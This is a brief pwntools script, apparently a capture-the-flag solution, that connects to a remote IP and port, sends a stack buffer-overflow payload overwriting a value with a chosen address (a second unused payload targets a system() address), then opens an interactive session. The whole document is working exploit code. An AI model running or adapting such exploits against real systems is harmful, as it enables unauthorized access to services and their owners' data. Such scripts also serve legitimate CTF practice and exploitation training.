from pwn import *
p = remote('1.14.71.254',28086)
#p=process("./c")
ret=0x0000000000400501 
add=0x41348000
sys=0x400530
payload=b'a'*(0x30+0x8)+p64(sys)
payload2=b'a'*(0x30-0x4)+p64(add)
p.sendline(payload2)
p.interactive()


